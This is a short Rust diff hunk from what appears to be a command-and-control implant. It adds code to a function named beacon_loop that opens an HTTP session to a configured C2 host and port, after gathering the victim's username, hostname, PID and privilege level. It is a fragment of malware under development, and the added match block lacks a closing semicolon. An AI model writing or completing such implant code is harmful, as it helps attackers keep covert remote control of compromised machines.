@@ -74,6 +74,10 @@ pub unsafe fn beacon_loop(config: &C2Config) {
     let sysinfo = gather_sysinfo();
     // debug!("[BEACON] {}@{} PID:{} ({})", sysinfo.username, sysinfo.hostname, sysinfo.pid, sysinfo.integrity);
 
+    let session = match HttpSession::new(config.host, config.port, config.use_https) {
+        Some(s) => s,
+        None =>  return,
+    }
 
     // TODO: Establish HTTP session
 }
